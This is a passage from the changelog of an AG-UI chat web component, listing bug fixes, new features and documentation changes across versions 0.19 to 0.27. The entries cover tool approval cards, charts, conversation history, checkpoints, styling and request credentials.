  produces no confirmation card in the browser — it has to be gated server-side,
  which surfaces as an approval card instead. The helper's doc comment and the
  README's confirmation section now say so.

- **A tool handler's thrown message reaches the model.** When a handler rejects,
  its `Error.message` is posted back as that call's tool result: into the
  conversation, on to the AG-UI endpoint, persisted there, and replayed to the
  model provider on every later round. That is deliberate — a real reason is
  what lets the agent recover — but the same string is only ever shown to the
  user as a short card label, so a host rethrowing an internal error had no way
  to see that an internal hostname, a signed URL or a stack-derived path had
  left the browser. `registerTool` and the README now say it plainly, so hosts
  can throw the message they would be content for the model to read.

## [0.27.0] — 2026-08-26

### Fixed

- **A deliberate cancel was reported as an error as well as a cancellation.**
  Pressing Stop (or Escape, or anything else that cancels a run) could put a
  warning bubble carrying the browser's own abort text — Chrome's is
  `BodyStreamBuffer was aborted` — directly above the muted stopped note: one
  deliberate stop, described twice, once as a failure. Cancelling aborts the
  response while its body is being read, and that abort can reach the AG-UI
  subscriber as a `RUN_ERROR` event, which was forwarded to `onError` without
  consulting the cancel flag. Only the promise route ever checked it. It looked
  intermittent because whether the abort produces a run error depends on where
  in the stream it lands. A cancelled run now reports the cancellation alone; a
  run that failed on its own still reports its error.

- **Chrome's mid-read abort was classified as a genuine error.**
  `isAbortError` matched only `name === "AbortError"`, and Chrome raises
  `TypeError: BodyStreamBuffer was aborted` when a fetch body is cancelled
  mid-read. The cancel flag hid this in the common case; an abort arriving
  without it — a caller aborting the request by another route — was reported as
  a failure. A `TypeError` whose message names the abort is now read as one.

- **The new-chat button deleted the conversation it left.** Pressing the header's
  new-chat button (or the drawer's "New chat", or calling `newChat()`) cleared the
  active thread from the store before minting the next id — the same call the
  drawer's own delete action makes. The conversation vanished from the history
  drawer, and with `data-threads-url` set it was deleted on the server too, since
  the remote store answers `clear` with a `DELETE`. The line predates the history
  drawer: it was written when "new chat" meant wiping the one conversation there
  was, and multi-thread support was layered over it. Starting a conversation now
  leaves the previous one where it was, to return to from the drawer. A thread
  nothing was ever sent in is still dropped — it never appeared in the drawer, so
  keeping it would only strand a record per press.

### Added

- **`ClientConversationStore.newThread()`** — start a conversation without
  destroying one. Optional, so an existing custom store keeps working: the
  element then mints the id itself and hands it to `setActiveThread`, which loses
  only the store's own record that the thread is new. `SessionStorageStore` and
  `RemoteConversationStore` both implement it.

## [0.26.1] — 2026-08-25

### Fixed

- **A chart the server retracted stayed on screen.** When an update replaced a
  chart with a payload that could not be drawn, the superseded chart was left in
  place — showing numbers the server had already withdrawn, reading as current —
  and then vanished on the next reload, because the *stored* content was the
  version that could not be drawn. Live and reload now agree, and both say gone.

- **`enableCharts()` after the element connected silently dropped every chart in
  restored history.** History replays on connect, and charts were off at that
  moment, so they were skipped. That is the ordinary way to call it — you have
  to query the element to call anything on it — so the first call now redraws
  rather than the docs asking for an ordering nobody can satisfy. The README
  example was that order.

- **A stacked chart wrote `NaN` into the DOM** for a series carrying more points
  than there are labels. `renderChart` is exported, so it can be handed a spec
  the validator would have refused; a cast there claimed that could not happen.

- **A sparse `labels` array was accepted**, drawing a chart with blank axis
  labels — `Array.prototype.some` skips holes.

- **A spec inside the point budget could still block the main thread.** The
  point limit bounds the data; the DOM is bounded by labels, since each emits an
  axis node whatever the series count. Now capped at 2,000 labels, and the
  ceiling applies again on every reload of a stored conversation.

### Documentation

- **Whether a pushed chart survives a reload depends on where the conversation
  is stored**, and the README now says which is which. A client-side store keeps
  activities; a server storing the thread as the model's message history does
  not, because a pushed chart is deliberately not in that history. An
  agent-requested chart survives either way — its spec travels as the tool
  call's arguments.

### Changed

- **The handler/render split is now enforced by a signature rather than a
  comment.** The replay path is handed the `render` function alone, never the
  tool that owns it, so the code that runs on restore cannot reach `handler`.
  The documentation claimed this guarantee was structural while the code passed
  the whole tool around and relied on two call sites happening not to use it.

- The built-in chart tool no longer builds the chart twice per call, once only
  to choose its reply string.

## [0.26.0] — 2026-08-25

### Added

- **Charts in the transcript**, by two routes that share one renderer, both
  opt-in via a new `enableCharts(routes)` method. Nothing draws a chart unless a
  host asks for it.

  - `enableCharts(["tool"])` registers a `render_chart` frontend tool the agent
    can call. The numbers are in its context, so it can discuss them.
  - `enableCharts(["activity"])` draws a server-pushed `ACTIVITY_SNAPSHOT` of
    type `chart`. The data never enters the model's context, there is no extra
    model round, and only this route can update a chart in place — repeat a
    `messageId` to redraw, or send an `ACTIVITY_DELTA` to move one series.

  Bar, line, pie, scatter and stacked, drawn as SVG built with `createElement`
  and never parsed from a string. That is the reason a chart is safe on a
  surface that keeps `img` off by default: the model chooses the numbers, the
  component chooses the DOM, so nothing chart-shaped reaches the sanitiser at
  all. Six theme tokens, `--ag-ui-chart-1` through `--ag-ui-chart-6`, and three
  parts: `chart-block`, `chart-title`, `chart-legend`.

- **`ClientTool.render`** — an optional, pure `(args) => Node | null` beside
  `handler`, and **the only half a restored transcript replays**. Replaying a
  tool's *effect* is out of the question — re-running a form-filling tool on
  every reload is a bug — so the two halves are separated structurally rather
  than by a flag: the restore path holds no reference to `handler`, so it cannot
  run it whatever a tool author intended. `render` must be a pure, deterministic
  function of its arguments; it runs again on every restore.

### Changed

- **`AgUiClientHandlers` gained a required `onActivityChanged` member**, and
  `onActivity` now receives the activity's `messageId` as a third argument. Both
  types are exported, so a consumer implementing the handler interface directly
  must add the member; anyone using `<ag-ui-chat>` is unaffected.
- `ClientTool.handler` now receives an optional `callId` as a second argument,
  for a handler that renders into the transcript and needs to place itself
  against its own card. Existing one-parameter handlers are unaffected.

## [0.25.2] — 2026-08-25

### Fixed

- **A server-side tool round went silent between the tool card and the answer.**
  The pending indicator is hidden when a tool call arrives, so the card can be
  the live thing on screen. Client-side tools put it back before returning their
  result; the server-side path never did — so once a streamed result settled the
  card, the wait while the server called the model again had nothing to own it.
  With a large attachment inlined into the tool result, and re-sent with every
  subsequent request, that is the longest pause in a run.

  The indicator now returns when a streamed result settles a card, and is
  cleared by whatever comes next: reasoning, the first text delta, the round
  ending, or the terminal settle guarantee. This is not the case 0.2.1 removed
  it for — that one runs after the run has ended, where nothing would clear it.
  The terminal guarantee that shipped in the same release is what makes showing
  it here safe.

## [0.25.1] — 2026-08-24

### Fixed

- **Two runs that opened on the same sentence read alike in the checkpoint
  panel.** A row leads with the run's first user message and hides the short id
  once it has one, on the argument that the words are the identity. A real run
  index then answered with five runs all opening on "what is on the board?", and
  those rows were as indistinguishable as five timestamps used to be. A preview
  identifies a run only while it is that run's own, so the id comes back for the
  rows whose preview another row repeats and stays hidden for the rows whose words
  are their own — one panel now shows some rows with an id and some without, each
  carrying the best identity it has. Previews are compared as the row renders
  them: whitespace collapsed, case kept, since two spellings a person can tell
  apart are two labels. No new part and no new fallback — `checkpoint-id` is the
  one the time-only row has always used.

## [0.25.0] — 2026-08-14

### Added

- **Every deferred call is asked about in its own card, and all of them at once.**
  A run can defer more than one call, and the wire takes a different answer for
  each — so the UI has to let a person give one, which means saying which card is
  which. Importing three rows gated three `create_event` calls and produced three
  identical prompts: the text comes from the tool, so all three read "Add this
  event to the board?", and nothing else on the card named the row. They were also
  serial, each appearing only once the previous was answered, appended below the
  three calls they gated — so a person answering the first could not compare them
  or tell that two more were coming. **A batch gate that can only be answered
  uniformly is one you have to answer blind.**

  Each prompt now renders into the tool card of the call it gates, under that
  call's own arguments, and every card opens at once. No new wire field was needed:
  the arguments were already there, and the call site already held the card. A
  card being asked about shows its arguments in every `data-tool-display` mode,
  since a density setting must not hide the answer to "which one is this". New
  part: `tool-card-approval`.

- **A status for "deferred, awaiting a decision".** `TOOL_CALL_STATUS` was
  `pending | done | error | declined`, so a gated call sat at `pending` and read
  **running…** while the stream was over and the server idle. A status enum missing
  a state does not omit that state, it renders it as whichever neighbour is
  closest, and this one claimed the opposite of the truth. Gated cards now read
  `waiting for you` (`data-status="deferred"`, `strings.toolDeferred`), with a
  steady dot instead of a spinner, and go back to `pending` on approval — because
  then the tool really is running. A **frontend** tool such as `ask_user` keeps
  saying "running…" while its card is open: the browser is executing it.

- **The checkpoint rows lead with what the run was about.** A run index that
  answers `GET runs/` with a `preview` — the run's first user message — and the
  panel now shows it, with the time demoted to a chip beside it (new part:
  `checkpoint-time`). A row with no preview keeps the old time-plus-short-id
  layout, so an older server is unaffected.

- **`toggleCheckpoints()` and `closeCheckpoints()`.** The built-in ⭯ control now
  calls the toggle, so pressing it a second time dismisses the panel;
  `openCheckpoints()` keeps its open-only meaning for a host that wants exactly
  that.
- **The checkpoint rows show a short run id.** A time is not an identity: two runs
  of the same minute both read "just now", and choosing between them was choosing
  blind. Eight characters of the id, muted, beside the time — with the whole id on
  its own `title` rather than on the row's label, so hovering a row no longer
  raises a full UUID over it. Now the fallback rather than the rule: a row that
  arrives with a `preview` leads with the words instead (see above).

### Changed

- **`approvalRenderer` is called once per interrupt, concurrently.** It used to be
  awaited one at a time. A host that can only ask one question at a time should
  queue inside its renderer.

### Fixed

- **The README's parts list was missing an entire feature, and now a test reads
  it.** Part names are declared public API there, and an undocumented part is not a
  part: a host cannot style what it cannot know exists, and a name guessed wrong
  fails silently. Absent were all twelve checkpoint-panel parts plus
  `checkpoints-button`, and five strays from other features (`code-copy`,
  `resize-handle`, `run-notice-icon`, `run-notice-text`, `skill-item-token`). The
  list drifted because nothing read it, so the fix is not only the missing names:
  it is now a table, spelled out in full rather than as `tool-card` *plus* `-icon`
  shorthand, and a test collects every part the source sets and fails on one the
  table does not name. The handful assembled at runtime are enumerated in that
  test, and adding another such call site fails it too.

- **The checkpoint panel could not be closed by the control that opened it.**
  The button called `open()`, which returns early when the panel is already open,
  so the first gesture anyone tries did nothing. Escape worked, and answering a row
  worked, and that was all. It now toggles, and a pointer landing anywhere else in
  the widget dismisses it — the thread drawer has a backdrop that swallows such a
  click, and this popover has none.

- **The thread drawer and the checkpoint popover could be open at once.** Opening
  either now closes the other. The pointer case was already covered by the
  click-away above, but a host driving its own chrome through `openThreads()` /
  `openCheckpoints()` raises no pointer event, and the drawer would slide open
  underneath a popover still floating over it.

- **The panel read as a list of clickable rows.** Each row painted itself on hover
  while nothing about the row was pressable: the two buttons that *were* pressable
  sat on that highlight as transparent outlines. The row now carries a resting
  surface and no hover at all, and the actions carry the filled-primary /
  outlined-secondary pair the confirmation and approval cards already use, plus
  `:active` and — new — a visible `:focus-visible` ring, in a panel that traps
  focus and is reached by Tab.

- **A narrow panel crushed the timestamp to nothing.** The row is a flex line whose
  only flexible child is the label, so it absorbs every fixed-width element the row
  gains; at 320px the label kept its text, reported it correctly, and measured 0px.
  This is the tool-call head's defect (0.24.0) one panel along, and it is now
  measured in a real browser at both widths — happy-dom lays out no boxes and
  called the broken row a pass.

- **The ⭯ glyph is now ↺.** The old one has no font behind it in most browsers and
  rendered as an unreadable mark at 14px. A header control nobody can name is one
  nobody presses.

- **The composer painted a paperclip that could not upload anything.** The element
  sets `hidden` on the attach button until a host gives it somewhere to upload —
  an `uploadHandler` or `data-attachments-url` — but the button's own
  `display: inline-flex` beat the UA stylesheet's rule for the hidden property, so
  it stayed visible and clickable, opening a file picker whose file had nowhere to
  go. This is the third instance of one trap: the attachment tray was fixed in
  0.23.0 and carries a comment about it two rules away in the same file. Found in
  the framework gallery, where three of the four host apps were in exactly that
  state and nobody had noticed the clip was inert.

  **The mic does not share it**, and the asymmetry is pinned by a test rather than
  assumed: the clip is created and hidden, while the voice wiring returns before
  constructing anything, leaving an empty slot that measures nothing. A
  hidden-state rule for the mic would match no element, so there is one rule.

## [0.24.0] — 2026-08-13

### Added

- **`ag-ui-run-finished`** — an event fired once per interaction, carrying the
  tools that ran and which side ran each (`{ tools: [{ name, side }] }`, typed
  `RunFinishedDetail` / `ToolRun`). **For hosts that render data the agent can
  change.** A server-side tool writes without the page's knowledge, and nothing
  the element dispatched implied "something may have moved underneath you": a
  page that fetched its data on mount had no reason to refetch, so approving a
  server-side write left it showing stale data with no way to notice. Shared
  state was the only channel back, and it is not one a host can rely on, because
  it needs the *agent* to emit `STATE_SNAPSHOT`. Fires on completion, error and
  cancellation alike, since a partial write is still a write; a capability load
  is not counted, since it moves nothing a host renders.

### Changed

- **A server-side approval can now ask a readable question.** An AG-UI
  interrupt's question defaults to the call spelled out —
  `Approve create_event({"title": "Design sync", …})?` — which is accurate and
  not something to put in front of a person, while the *client-side*
  confirmation card has had `x-confirm` for exactly this. The approval card now
  prefers `x-confirm` from the interrupt's `metadata`, so one key covers both
  gates, and a server that supplies nothing keeps the generated text. Anything
  non-string or blank under that key is ignored rather than rendered, since a
  wire field typed `Record<string, any>` can carry an object into the one place
  a person is being asked to allow a write.

### Fixed

- **Every first visit spent a request to be told `404`.** With
  `data-threads-url` set, the element minted a thread id on mount and
  immediately asked the server for its history — history that cannot exist,
  because the id was three lines old. The response was correct and harmless, and
  it put a red `404` in the console of a page where nothing had gone wrong, on
  every first visit to every host. `ClientConversationStore` gained an optional
  `isUnsent(threadId)`, which the session store answers from a marker it sets when
  it mints and drops on the first save, and the remote store skips the fetch when
  it is `true`. Deliberately narrow: *"I hold no messages for this id"* is not the
  same claim as *"this id is new"*, and only the store that minted it can make the
  second one — so a thread picked from the drawer, or created on another device,
  is still fetched.
- **An approved call's tool card broke its own name into pieces.** The card's
  head is a flex row in which the name is the only flexible child, so every
  fixed badge the row gains is taken out of it. The decision badge ("approved by
  you") appears only on the server-approval path, and in a sidebar-width panel it
  left the name **37px** wide: `word-break: break-word` then split *Create event*
  into "Creat / e / event" across three lines. The head wraps now and the name
  keeps a floor instead of a zero min-width, so a badge drops to its own row
  rather than shredding a word, while a genuinely unbreakable name still breaks
  instead of overflowing the card. Measured in a real browser at 470px: the name
  went 37px to 144px and three lines to one.

### Documentation

- **The four framework recipes, not just React's.** The connect-time
  configuration boundary is reached differently by each host, and only **Vue**
  has a hook that runs before insertion (a directive's `beforeMount`); React,
  Svelte 5 and Angular all create the element by hand. Angular additionally needs
  `:host { display: contents }` or its own host element breaks the page's layout.
- **Page actions**: a page action reports that it *fired*, not that it worked;
  a page that saves asynchronously should say so (a `saving` flag in the page
  map) or a verification read will outrun the save; `drag_and_drop` dispatches
  the **native HTML5 drag sequence**, which a pointer-event drag library
  (dnd-kit, the Angular CDK) never sees; and `scroll_to` centres vertically but
  brings into view horizontally.
- **`placement="embedded"` fills the box the host gives it — so give it one.**
  `min-height: 0` plus `overflow: hidden` on the containing element, or a growing
  transcript pushes the composer off the bottom of the window.
- **The auto-injected page map may go nowhere.** It rides in
  `RunAgentInput.context`, and pydantic-ai's AG-UI adapter does not read that
  field, so on such a backend the injected copy is silently dropped and
  `read_page` is the channel that works.

## [0.23.1] — 2026-08-13

### Fixed

- **A reloaded conversation lost every turn after the first plain answer.**
  Restoring stored history iterated `message.toolCalls` behind an
  `!== undefined` check, and an assistant turn that called no tool can arrive
  carrying `null`: the protocol's Python models declare
  `tool_calls: list[ToolCall] | None`, so a server dumping them without
  `exclude_none` sends exactly that, while `@ag-ui/core` types the field
  optional-and-not-nullable — TypeScript therefore offered no hint that the value
  was reachable. Iterating it threw `TypeError: toolCalls is not iterable`
  *inside* the replay, which aborted at that message and left every later turn
  out of the transcript. Nothing surfaced: no error state, no partial-history
  notice, just a short conversation. Measured against a server-backed store, a
  54-message thread restored as two bubbles and one tool card.

  Two things follow from where the throw happened, and both are now closed.
  Tool calls are **narrowed rather than trusted** — the same stance
  `messageAttachments` already takes for the neighbouring field on the same
  message, and for the same reason. And a **shapeless entry is skipped instead of
  ending the replay**: a stored call with no `id`, no `function.name`, or a
  `null` where an object belongs no longer costs the rest of the conversation.
  A call whose `arguments` are missing or not a string still renders, with empty
  arguments, because its name is the part worth showing.

  Only a **server-backed** history reaches this: the default
  `SessionStorageStore` round-trips client-shaped objects through JSON, where an
  absent field stays absent, so the `null` never appears. Anything reading a
  thread index — `data-threads-url` — did, including every Django admin
  configured with a conversation store. There the cost was worse than a short
  transcript: each navigating tool reloads the page and the run continues only
  because the component rehydrates and completes the pending call, so a thread
  that had answered once abandoned its next multi-step task at the first
  navigation.

## [0.23.0] — 2026-08-12

Attachment chips, which turned out to be the least finished corner of 0.22.

### Fixed

- **A filename on a sent attachment chip was invisible on the stock light
  theme.** `.attachment-chip` set the assistant surface as its background but no
  colour, so on a user bubble it inherited `--ag-ui-user-fg` — white on
  `#f1f1f6`, a contrast ratio of 1.13:1 where WCAG AA wants 4.5:1. Only the size
  stayed legible, because it sets its own muted colour, which is exactly how the
  bug read to a user: an icon, a blank gap, and a size. The chip now takes
  `--ag-ui-text`, the same consumer-overridable token the rest of the body text
  uses, so a page that themes its text themes the chip with it. The dark and
  code themes were never affected, which is why this shipped.

- **The composer's attachment tray never collapsed.** The tray sets `hidden`
  while it holds no chips, but its rule declared `display: flex` with no
  `[hidden]` guard, and an author `display` beats the UA stylesheet's
  `[hidden] { display: none }`. Every embed that wired uploads therefore carried
  8px of dead space above the composer at all times. With the tray genuinely
  collapsing, its padding is also symmetric again (`8px 12px`), so a chip clears
  the composer's top edge instead of sitting flush against it.

- **Filenames truncated far short of the space available.**
  `.attachment-chip-name` capped itself at `14ch`, so
  `LQ27552-7006-EXHIBIT-A.pdf` rendered as `LQ27552-7006 …` inside a chip with
  room to spare. The cap is gone: the chip is already `max-width: 100%` with the
  name ellipsising, so its container bounds it, and a genuinely long name now
  ellipsises at the edge it actually reaches. The chip is `box-sizing:
  border-box` with it, which stops that `100%` from overflowing its container by
  the chip's own padding and border.

### Changed

- **Attachment chip icons are inline SVG.** 0.22 moved the chrome's glyphs to
  inline SVG and stopped at the chips, leaving emoji sitting beside SVG send,
  attach and mic buttons — a different optical weight, varying by platform, and
  taking neither `currentColor` nor a size from CSS. Four marks (image, PDF,
  text, generic) now follow the same contract as the rest, painted from the
  chip's own colour so an errored chip turns red glyph and all. Both the sent
  bubble's chips and the composer tray's change together.

### Removed

- **The client-side attachment manifest in `RunAgentInput.context`.**
  `getContext()` appended a one-line summary of the message's attachments; the
  server now derives that from the refs riding the messages, so the client's
  copy only duplicated it on the turn a file was attached. Attachments still
  reach the agent — through the message, which is where they already were. The
  page-map half of `getContext()` is unchanged.

  **This needs a server that derives the manifest itself.** `django-ag-ui`
  does so from 0.42.0. Against an older server nothing replaces the client's
  copy, so the agent stops being told which attachment ids exist and answers a
  question about an attached file by asking for the file — which is the defect
  the server-side derivation was written to fix. Upgrade the server first, or
  together. A host that read the manifest out of the run context itself is
  likewise affected.

## [0.22.0] — 2026-08-11

Two complaints about how the widget *feels*, and both turned out to be structural
rather than cosmetic.

### Changed

- **The composer is one surface, not four boxes.** The input row was a flat flex
  row — attach, mic, textarea, send — with every sibling stretched to the
  textarea's two-row height. That gave a paperclip the same visual weight as the
  field it sits next to and made Send a full-height filled slab. The border,
  background and focus ring now belong to a wrapping `composer-surface`: the
  field is borderless and **grows with what is typed** (from one row up to
  `--ag-ui-composer-max-height`, then scrolls), and a `composer-tools` row
  underneath carries the paperclip and mic as quiet icon buttons with a circular
  Send closing the right-hand end.

  Send is now icon-only. Its accessible name still comes from the `send` /
  `stop` strings (`aria-label` + `title`), and the run state swaps its glyph
  rather than its text, so nothing moves when a run starts. A host that sized
  `::part(send)` by its padding should switch to `--ag-ui-send-size`.

- **Collapsing goes to a round floating launcher.** `collapsed` used to leave the
  full-width header bar sitting on the page, which is most of a chat widget's
  footprint for none of its use. The panel now scales down into a launcher in the
  corner it already occupies and the launcher grows back out of that point;
  `transform` and `opacity` are all that animate, so the morph is
  compositor-only and cannot reflow the host page. `placement="sidebar"` keeps
  its edge rail (and now genuinely *slides* out through the edge it docks
  against — the transition was declared but never wired to a transform), and
  `embedded` / `page` keep the header bar, being host-laid-out and full-screen
  respectively.

  This changes what an existing floating embed looks like when collapsed. The
  collapsed host keeps its box with `pointer-events: none`, so the page beneath
  stays interactive and the launcher takes the clicks.

- **The chat-history drawer and the checkpoints panel slide.** Both were toggled
  with `hidden` alone, which snaps. They now keep their box and hide with
  `visibility`, which is what lets a surface animate *in and out* — an element
  that was never rendered has no before-change style to animate from, and one
  whose `display` flips to `none` cannot animate at all.

- **The chrome's glyphs are inline SVG** (send, stop, paperclip, mic, launcher)
  rather than emoji, each in a slot with the mark as its fallback:
  `icon-send`, `icon-stop`, `icon-attach`, `icon-voice`, `launcher`.

### Added

- **An unread badge on the launcher.** A collapsed widget is the one state where
  an answer can arrive with nothing on screen to say so, so the launcher now
  counts the answers that finished while it was closed (capped at `9+`) and
  expanding marks them read. It is the only affordance here that is **on by
  default**; `data-unread-badge="false"` turns the badge off, and the count keeps
  running so a host chrome can render its own from the new `ag-ui-unread` event
  (`UNREAD_EVENT` / `UnreadDetail`, plus a `chat.unread` getter). The count is
  also the launcher's accessible name — a coloured dot says nothing to a screen
  reader — via the new `expandUnread` string. Tokens:
  `--ag-ui-badge-{bg,fg,size,font-size}`; part `launcher-badge`.

- **`data-launcher-icon-url`** — an icon for the collapsed launcher when it should
  differ from the header's. Falls back to `data-icon-url`, so one attribute still
  feeds both.

- **Motion tokens** — `--ag-ui-motion`, `--ag-ui-ease`, `--ag-ui-ease-pop`. One
  duration and two curves drive every collapse, expand and slide-over. Under
  `prefers-reduced-motion` the duration collapses to a frame; `--ag-ui-motion: 0s`
  switches the animation off outright.

- **Launcher and composer tokens** — `--ag-ui-launcher-{size,bg,fg,radius,icon-size,inset}`,
  `--ag-ui-composer-{radius,max-height}`, `--ag-ui-send-size`, `--ag-ui-tool-btn-size`,
  `--ag-ui-glyph-{size,stroke}`; parts `composer-surface` and `composer-tools`.

- **Motion tests that run in a real browser.** happy-dom runs no transitions, so
  every assertion about this would pass on a stylesheet where nothing animates.
  The Chromium project now asserts on `getAnimations()` — that the browser
  actually *started* the transitions a collapse, an expand and a drawer open are
  supposed to start.

## [0.21.0] — 2026-08-11

Ten findings from a real embed — a cross-origin, cookie-authenticated React host.
Six of them are one defect: **the component assumed it owned the page.** It had
only ever been embedded in its own playground and in `django-admin-agent`, two
hosts that both arrange the page the way it expects.

### Added

- **`getHeaders`** — a function consulted immediately before **every** request, so
  a rotating credential (a short-lived JWT, a re-issued CSRF token) reaches the
  request that needs it. `headers` was a plain field the element never wrote to,
  read at ten sites; configuring auth through `agentFactory` therefore
  authenticated the run and nothing else, and thread history, attachments and the
  catalogs went out anonymous and 401'd — which reads as a backend fault. The two
  compose, merged per key with `getHeaders` winning, so adding a rotating header
  cannot silently drop a static one.

- **`credentials`** (attribute and property) — `omit` / `same-origin` / `include`,
  applied to every request. There was previously no occurrence of `credentials`
  anywhere in the source, so every request used the browser default and a host
  serving its SPA and API from different subdomains sent no cookies, with **no way
  to express the fix** short of replacing the transport. An unknown value is
  rejected where it was written (the property throws; the attribute logs and stays
  inert) rather than becoming a 401 later.

- **`flash(el, options)`** — ring an element without moving focus.
  `focusWithFlash` calls `el.focus()`, which for a helper named "flash" is
  surprising: it takes focus off the composer, can fire blur validation on
  whatever the user was mid-edit in, and can close a menu. Both now accept an
  explicit `focus` option, and `focusWithFlash` focuses with `preventScroll: true`
  so it no longer fights the scroll it just started.

- **`openThreads()` / `openCheckpoints()` / `reload()`.** The header's controls all
  live inside `::part(header)`, so a host rendering its own title bar and hiding it
  lost thread switching entirely. The built-in buttons call exactly these methods,
  so the two routes cannot drift. `reload()` re-runs the startup fetches once
  credentials that arrive late have landed.

- **`ScrollOptions`**, and `scrollIntoCenterView` now returns a promise that
  resolves when the scroll has settled (`scrollend` where available, a short probe
  when nothing moved, a 600 ms cap otherwise). Every DOM-driver primitive awaits it.

### Changed

- **CSS custom properties now work from an ancestor**, which is what the README
  always described and the one thing that could not work: every `--ag-ui-*` default
  was declared on `:host`, which sets the property *on the element*, and an
  element's own value beats anything inherited. A consumer ran the full token map
  on a wrapper for an entire build and concluded they had the names wrong. The
  defaults now sit behind private aliases, so `:root`, a wrapper, the element and
  an inline style all work and resolve in the usual order. **One vocabulary — the
  public `--ag-ui-*` names are unchanged**, and a built-in `theme` / `density` /
  `placement` preset still loses to an explicit page rule.

- **The flash is an `outline`, not a `box-shadow`**, and holds for **1200 ms** with
  a fade rather than 200 ms. A shadow paints outside the border box, so any
  `overflow: hidden` ancestor sharing the element's box — a card, a table cell —
  clipped it entirely while the tool reported success. And 200 ms is below the
  threshold at which someone who does not know where to look notices anything.
  Neither our tests nor the consumer's could have found the second one:
  headless Chromium hides the scroll race, and no automated check has an opinion
  about whether a human sees a 200 ms ring.

- **The flash colour comes from the target's `--ag-ui-accent`** rather than a
  hardcoded indigo, so a themed page is flashed in its own colour.

- **`prefersReducedMotion()` is now honoured where the README already claimed it
  was.** The flash ignored it entirely while the docs said the preference was
  "honoured throughout"; a consumer investigated reduced motion as the cause of an
  invisible highlight on the strength of that sentence. Under reduced motion the
  ring drops its fade but keeps its full hold — reduced motion asks for no
  animation, not for no feedback. `typeInto` and `highlightThenClick` keep their
  explicit-duration contract, and the docs now say so instead of overclaiming.

- **The tool and skill catalog fetches are deferred by one microtask**, so a React
  `ref` assigned in the same commit as insertion is honoured. The thread-history
  request is deliberately **not** deferred: a deferred replay can land after a
  `sendMessage()` and duplicate the transcript. Configure before you insert, or
  call `reload()`; the new React recipe in the README shows both.

### Fixed

- **The resize grip now sits on the corner that actually moves.** The element
  measures which edges its host's layout holds still and stamps them as
  `data-resize-anchor="<y>-<x>"`, but the rules meant to read it were written as
  `[data-resize-anchor~="left"]` — and `~=` matches whitespace-separated words
  while the stamped value is a single hyphenated token, so they could never
  match. **The cursor rules used `=` and did match**, so the pointer followed
  the measurement while the grip stayed where `placement` had guessed: for any
  host that aligns the panel the other way, the cursor promised a diagonal the
  grip was not on, and the grip sat on the corner that stays put.

  Each anchor rule now sets **both** sides of its axis. One that flipped a
  single way could not undo a placement guess that had flipped the other, which
  put the grip back on the anchored corner for an embedded panel its host
  right-aligns.

- **`placement="page"` gutters its composer to the same reading column as its
  messages.** The rule was unscoped, which tied it on specificity with the base
  `.input-row` rule that sets the `padding` shorthand later in the stylesheet;
  source order decided and the shorthand won. ⇒ *No placement ever got the
  gutter* — least of all the one it was written for, where the messages sat in a
  centred column and the composer spanned the full width.

  A duplicated copy of the whole resize block also sat earlier in the file,
  welded to the preceding rule by a comment left between a selector and its
  subject; it parsed as `:host([placement="page"]) .resize-handle`, scoping the
  grip's base positioning to the one placement that hides it.

## [0.20.1] — 2026-08-11

### Fixed

- **`placement="side"` (and `sidebar`) stopped being full height once the
  panel had been resized.** A dragged size is written as a custom property on
  the host, and an inline custom property **outranks a `:host([placement=…])`
  rule setting the same property** — so a height dragged while floating capped a
  docked sidebar that had asked for `100vh`. Since the size persists per tab,
  one drag broke every later visit.

  **The previous release claimed this was already handled, and the reasoning
  was wrong.** Writing `--ag-ui-height` rather than inline `height` was supposed
  to leave placement with the final say; it does not, because the indirection
  changes nothing about the cascade. The fix is explicit rather than
  cascade-dependent: **a placement owns the axes it fixes**, a persisted size is
  applied only to the axes it leaves free, and switching placement hands the
  owned axes back.

  ⇒ *"I used the more specific-looking mechanism" is not a substitute for
  checking which declaration actually wins.*

## [0.20.0] — 2026-08-11

### Added

- **The panel is resizable.** A drag handle on the corner the layout grows
  toward (or the inner edge when docked), with the size persisted per tab and
  restored before the first paint. Arrow keys resize from the keyboard, since a pointer-only control
  has no equivalent elsewhere in the UI; style it via the `resize-handle` part.

  Which axes are draggable is the placement's call: `full` and `page` get no
  handle at all (a `100vw`/`100vh` layout has nothing to drag), `sidebar` /
  `side` get width only, everything else gets both.

  **It writes the custom properties, not inline `width` / `height`.** The
  placement rules set those same properties, so an inline dimension would
  outrank them — a panel dragged while floating would keep that width after
  switching to fullscreen.

  **Which corner the grip sits on is measured, not assumed.** A resize is
  computed from the edge that stays still, and which edge that is belongs to the
  *host's* layout rather than to `placement` — a floating panel is pinned
  bottom-right, an embedded one goes wherever the page's CSS puts it. Deriving
  it from `placement` was wrong for any host that right-aligns the element, and
  the symptom was bad enough to read as a broken control: the panel shrank when
  dragged outward and travelled by its opposite corner. The element now probes
  its own geometry and reflects the result as `data-resize-anchor`.

### Changed

- **The `/` palette leads with the command.** Each row now reads
  `/fill-article Fill the article` rather than the label alone (part
  `skill-item-token`), and a chip's tooltip names the token it stands for. A
  palette that shows only labels cannot teach its own vocabulary — a user who
  never sees `/fill-article` has no way to learn to type it.

- **A skill blocked on an unfilled `{placeholder}` now hands back the
  template.** The partially-filled prompt goes into the composer with the first
  unresolved placeholder selected, so the next keystroke replaces it. Previously
  the pick was refused with a hint and whatever the user had typed to open the
  palette — a lone `/` — was left in the composer, which said nothing about what
  the skill wanted or how to supply it. The hint now says what to do, too.

- **Picking a skill now sends it.** It used to write the text into the
  composer and wait for a second click unless the skill set
  `sendImmediately: true` — so the default behaviour of a shortcut was to not
  take the shortcut. Set `sendImmediately: false` to keep pre-filling, which is
  worth doing where the user is expected to edit before sending.

- **`Skill.prompt` is now optional, and omitting it is the better default for
  anything internal.** A skill with no prompt is **server-resolved**: picking it
  sends the bare `/name` token and the agent expands it, from the harness
  `Skills` capability or the server's own instructions.

  **The prompt was the leak.** A catalog is either a fetched `GET` or an
  inline `data-skills` attribute sitting in the page source, and a skill is
  often where a project's internal workflow is written down most plainly — so
  the client-side catalog published it to anyone who opened the page. Sending a
  token instead keeps the wording on the server entirely, which is what
  "trigger a `/command` without exposing the prompt" actually requires; hiding
  the text behind a chip label would only have moved it off screen.

  `parseSkills` accepts a catalog entry with no `prompt` rather than dropping
  it — requiring the field would have silently discarded exactly the skills
  whose wording was kept off the browser. Pairs with `django-ag-ui`'s
  `SkillSpec.prompt` becoming optional.

## [0.19.0] — 2026-08-11

### Changed

- **A tool card's arguments and its result are now two labelled regions, not one
  block.** Compact mode emitted `args: {...}` and the result into a single
  `<pre>` separated by a blank line, with nothing marking where the call ended
  and the answer began. Both payloads now have their own heading, their own
